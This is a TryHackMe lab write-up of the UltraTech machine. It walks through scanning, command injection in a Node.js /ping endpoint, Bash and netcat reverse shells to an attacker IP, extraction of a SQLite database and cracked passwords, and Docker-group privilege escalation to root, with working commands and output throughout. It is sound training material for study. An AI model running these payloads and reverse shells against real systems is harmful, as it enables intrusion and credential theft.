🧪 TryHackMe — UltraTech

<p align="center">
  <img src="https://img.shields.io/badge/TryHackMe-UltraTech-red?style=for-the-badge&logo=tryhackme" alt="TryHackMe">
  <img src="https://img.shields.io/badge/Difficulty-Medium-orange?style=for-the-badge" alt="Difficulty">
  <img src="https://img.shields.io/badge/Category-Web%20%7C%20Linux%20%7C%20PrivEsc-blue?style=for-the-badge" alt="Category">
</p><p align="center">
  <b>Grey-box penetration testing lab focused on web exploitation, command injection, credential extraction and Docker privilege escalation.</b>
</p>---

📋 Machine Information

Information| Details
Platform| TryHackMe
Machine| UltraTech
Difficulty| Medium
Assessment Type| Grey-box
Target OS| Linux
Main Attack Vector| OS Command Injection
Privilege Escalation| Docker
Final Access| "root"

---

🗺️ Attack Path

┌──────────────────────┐
│   Network Discovery  │
└──────────┬───────────┘
           │
           ▼
┌──────────────────────┐
│  Web Enumeration     │
│  Apache + Node.js    │
└──────────┬───────────┘
           │
           ▼
┌──────────────────────┐
│    API Discovery     │
│       /ping          │
└──────────┬───────────┘
           │
           ▼
┌──────────────────────┐
│ Parameter Fuzzing    │
│        ip=           │
└──────────┬───────────┘
           │
           ▼
┌──────────────────────┐
│  Command Injection   │
└──────────┬───────────┘
           │
           ▼
┌──────────────────────┐
│ Local Enumeration    │
│ utech.db.sqlite      │
└──────────┬───────────┘
           │
           ▼
┌──────────────────────┐
│ Credential Extraction│
└──────────┬───────────┘
           │
           ▼
┌──────────────────────┐
│  Password Cracking   │
└──────────┬───────────┘
           │
           ▼
┌──────────────────────┐
│    SSH as r00t       │
└──────────┬───────────┘
           │
           ▼
┌──────────────────────┐
│   Docker Group       │
└──────────┬───────────┘
           │
           ▼
┌──────────────────────┐
│ Docker PrivEsc       │
└──────────┬───────────┘
           │
           ▼
╔══════════════════════╗
║         ROOT         ║
╚══════════════════════╝

---

🔎 1. Reconnaissance

I started with a full TCP port scan, service version detection and default NSE scripts.

nmap -sV -sC -Pn -p- <TARGET>

Open Ports

21/tcp      FTP       vsftpd 3.0.5
22/tcp      SSH       OpenSSH 8.2p1 Ubuntu 4ubuntu0.13
8081/tcp    HTTP      Node.js / Express
31331/tcp   HTTP      Apache 2.4.41 (Ubuntu)

The HTTP service running on port "31331" was unusual, so I started with web enumeration.

---

🌐 2. Web Enumeration

I ran Gobuster against the Apache service:

gobuster dir \
-u http://<TARGET>:31331 \
-w /usr/share/wordlists/dirb/common.txt \
-x js

The scan discovered:

/js

Since JavaScript files can contain references to API endpoints, I checked for references to the Node.js service:

curl -s http://<TARGET>/js | grep "8081"

No useful result was returned.

I then moved to the Node.js application running on port "8081".

gobuster dir \
-u http://<TARGET>:8081 \
-w /usr/share/wordlists/dirb/common.txt

Interesting endpoints:

/auth
/ping

---

🧩 3. API Enumeration

Requesting "/ping" without the expected parameter resulted in an error.

The error indicated that the application was attempting to use ".replace()" on a parameter.

This suggested that the endpoint was processing user-controlled input.

I used FFUF to discover the parameter name:

ffuf \
-u "http://<TARGET>:8081/ping?FUZZ=test" \
-w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt \
-fs 1094

The parameter discovered was:

ip

I tested it with a normal IP address:

curl "http://<TARGET>:8081/ping?ip=127.0.0.1"

The endpoint returned the expected ping output.

At this point, the "ip" parameter became the primary attack surface.

---

💥 4. Command Injection

I tested whether I could append another command to the ping operation.

I used URL-encoded newline characters:

curl "http://<TARGET>:8081/ping?ip=127.0.0.1%0aid"

The response included:

uid=1002(www)
gid=1002(www)
groups=1002(www)

This confirmed arbitrary OS command execution.

🐛 Vulnerability

The application was passing user-controlled input to a system command without properly sanitizing the value.

Impact: arbitrary command execution in the context of the "www" user.

---

🐚 5. Reverse Shell Attempts

After confirming command injection, I attempted to obtain an interactive shell.

My first attempt used "nc" with the "-e" option:

nc${IFS}<ATTACKER_IP>${IFS}4444${IFS}-e${IFS}/bin/bash

This failed.

The target returned:

nc: invalid option -- 'e'

The usage output indicated that the installed version of Netcat did not support "-e".

This was useful information because it showed that I needed another approach for the reverse shell.

I then tested a Bash-based reverse shell:

bash -c 'bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1'

The reverse shell succeeded.

I also used:

nohup bash -c 'bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1' &

The resulting shell was:

bash: cannot set terminal process group (...): Inappropriate ioctl for device
bash: no job control in this shell
www@ip-10-66-180-224:~/api$

At this point, I had a shell as "www".

---

📂 6. Local Enumeration

From the command injection, I started enumerating the application directory.

curl "http://<TARGET>:8081/ping?ip=127.0.0.1%0als%20-la"

The directory contained:

total 84
drwxr-xr-x 3 www www 4096 ...
-rw-r--r-- 1 www www 1750 ... index.js
-rw-rw-r-- 1 www www 283 ... !nc
drwxrwxr-x 167 www www 4096 ... node_modules
-rw-r--r-- 1 www www 370 ... package.json
-rw-r--r-- 1 www www 45458 ... package-lock.json
-rwxr-x--- 1 www www 124 ... start.sh
-rw-r--r-- 1 www www 8192 ... utech.db.sqlite

The most interesting file was:

utech.db.sqlite

A SQLite database inside the application directory was a strong candidate for sensitive information.

---

🗄️ 7. SQLite Database Extraction

I first confirmed that I could read the database through command injection:

curl "http://<TARGET>:8081/ping?ip=127.0.0.1%0acat%20utech.db.sqlite"

Instead of relying on the HTTP response alone, I downloaded the database locally.

Because the database was binary data, I used "curl -G" with "--data-urlencode":

curl -G "http://<TARGET>:8081/ping" \
--data-urlencode "ip=127.0.0.1
cat utech.db.sqlite" \
-o meu_banco.db

The file was successfully downloaded:

8453 bytes

The database contained application credentials.

Relevant users included:

r00t
admin

The "admin" account had the following hash:

0d0ea5111e3c1def594c1684e3b9be84

---

🔐 8. Credential Recovery

The recovered hashes were subjected to offline password cracking.

Recovered credentials:

Username| Password
"r00t"| "n100906"
"admin"| "mrsheafy"

I then investigated the "/auth" endpoint.

First:

curl "http://<TARGET>:8081/auth"

The application responded:

You must specify a login and a password

I tested the recovered credentials:

curl "http://<TARGET>:8081/auth?login=admin&password=mrsheafy"

The application returned:

<h1>Restricted area</h1>
<p>
Hey r00t, can you please have a look at the server's configuration?
The intern did it and I don't really trust him.
Thanks!
</p>
<i>lp1</i>

The credentials were valid.

---

🧪 9. Authentication Testing

Before moving on, I also tested the authentication endpoint for SQL injection.

Examples included:

admin'--

'OR'1'='1

No apparent SQL injection was identified.

I also tested a JSON POST request, but the application returned:

Cannot POST /auth

This confirmed that "/auth" was intended to be accessed through "GET".

---

🔑 10. SSH Access

With valid credentials available, I tested SSH access.

ssh admin@<TARGET>

The "admin" account did not provide SSH access.

I then tested the recovered "r00t" credentials:

ssh r00t@<TARGET>

This succeeded.

I checked the current privileges:

id

Result:

uid=1001(r00t)
gid=1001(r00t)
groups=1001(r00t),116(docker)

The important finding was:

116(docker)

The user was a member of the "docker" group.

---

🐳 11. Docker Privilege Escalation

I enumerated the available Docker images:

docker images

The target contained:

REPOSITORY   TAG      IMAGE ID        SIZE
bash         latest   495d6437fc1e    15.8MB

Membership in the Docker group is security-sensitive because Docker provides highly privileged interaction with the host.

I launched a container while mounting the host filesystem:

docker run -v /:/mnt --rm -it bash chroot /mnt /bin/sh

Inside the resulting environment, I checked my privileges:

id

Result:

uid=0(root)
gid=0(root)
groups=0(root),1(daemon),2(bin),3(sys),4(adm),6(disk),10(uucp),11,20(dialout),26(tape),27(sudo)

💀 Root access obtained.

The host filesystem was mounted into the container and "chroot" was used to operate directly against it.

---

🏆 12. Final Attack Chain

Full TCP Scan
      │
      ▼
Apache :31331
      │
      ├───────────────┐
      │               │
      ▼               ▼
   /js            Node.js :8081
                      │
                      ▼
                    /ping
                      │
                      ▼
              Parameter Fuzzing
                      │
                      ▼
                    ip=
                      │
                      ▼
             Command Injection
                      │
                      ▼
              www Shell / RCE
                      │
                      ▼
            Local Enumeration
                      │
                      ▼
             utech.db.sqlite
                      │
                      ▼
           Credential Extraction
                      │
                      ▼
            Password Cracking
                      │
                      ▼
                r00t:n100906
                      │
                      ▼
                 SSH Access
                      │
                      ▼
               docker group
                      │
                      ▼
            Docker PrivEsc
                      │
                      ▼
              Host Filesystem
                      │
                      ▼
                    ROOT

---

🛡️ 13. Vulnerabilities Identified

#| Finding| Impact
1| OS Command Injection| Arbitrary command execution
2| Sensitive SQLite database exposure| Credential/hash disclosure
3| Weak/recoverable passwords| Account compromise
4| Excessive Docker privileges| Root-level host compromise

---

🧰 14. Tools Used

- "Nmap" (https://nmap.org/)
- "Gobuster" (https://github.com/OJ/gobuster)
- "FFUF" (https://github.com/ffuf/ffuf)
- cURL
- CrackStation
- SSH
- Docker
- Linux shell

---

🧠 15. Lessons Learned

Enumeration is everything

The initial command injection was only useful because it was followed by proper local enumeration.

Command Execution
        ↓
Enumerate
        ↓
Find Interesting File
        ↓
Extract Database
        ↓
Recover Credentials

Failed attempts are useful

My first reverse shell attempt failed because the target's Netcat implementation did not support the "-e" option.

Instead of stopping there, I used the error message to understand the environment and switched to a Bash-based reverse shell.

Vulnerabilities are often chained

No single discovery immediately resulted in root.

The compromise required chaining multiple weaknesses:

Command Injection
      +
Database Exposure
      +
Weak Credentials
      +
SSH Access
      +
Docker Group
      =
ROOT

---

📚 16. Skills Practiced

✔ Full TCP Port Enumeration
✔ Service Enumeration
✔ Web Enumeration
✔ API Enumeration
✔ Parameter Fuzzing
✔ Command Injection
✔ URL Encoding
✔ Linux Enumeration
✔ Reverse Shells
✔ SQLite Database Extraction
✔ Credential Discovery
✔ Password Cracking
✔ SSH Authentication
✔ Docker Enumeration
✔ Linux Privilege Escalation
✔ Attack Chain Development

---

💀 Conclusion

UltraTech was the most challenging machine I had completed at this point.

The machine required chaining several stages rather than relying on a single straightforward exploit.

The final path was:

«Recon → Enumeration → Command Injection → Database Extraction → Credential Recovery → SSH → Docker Privilege Escalation → Root»

The biggest takeaway was learning to follow the evidence provided by each stage of the assessment and use it to determine the next attack path.

---

<p align="center">
  <b>ROOT ACCESS OBTAINED 💀</b>
</p><p align="center">
  <i>TryHackMe — UltraTech</i>
</p>
